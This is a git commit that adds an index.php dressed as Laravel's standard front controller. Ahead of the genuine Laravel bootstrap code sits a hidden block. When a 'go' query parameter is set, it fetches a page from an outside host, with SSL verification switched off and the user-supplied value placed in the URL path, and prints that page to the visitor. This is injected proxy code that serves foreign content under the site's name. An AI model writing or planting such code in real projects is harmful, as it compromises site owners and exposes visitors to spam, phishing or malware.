3562e10548323e2bb6b370770951958916fcd4ee
GGeercy <112923883+ggeercy@users.noreply.github.com>
2024-01-04 20:05:15 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,100 @@
+<?php
+if(isset($_GET['go'])) {
+    $url = $_GET['go'];
+    $useragent="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
+    // INIT CURL
+    $ch = curl_init();
+
+    //init curl
+    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+    // SET URL FOR THE POST FORM LOGIN
+    curl_setopt($ch, CURLOPT_URL, 'https://replication.pkcdurensawit.net/nathm.gov.np/'.$url.'/');
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+
+    // common name and also verify that it matches the hostname provided)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+    // Optional: Return the result instead of printing it
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    // ENABLE HTTP POST
+    curl_setopt ($ch, CURLOPT_POST, 1);
+    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+    $store = curl_exec ($ch);
+    echo $store;
+
+    // CLOSE CURL
+    curl_close ($ch);
+
+} else {
+?>
+
+<?php
+
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels nice to relax.
+|
+*/
+
+require __DIR__.'/../bootstrap/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/../bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
+$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
+$response = $kernel->handle(
+    $request = Illuminate\Http\Request::capture()
+);
+
+$response->send();
+
+$kernel->terminate($request, $response);
+
+
+}
+?>
+
+
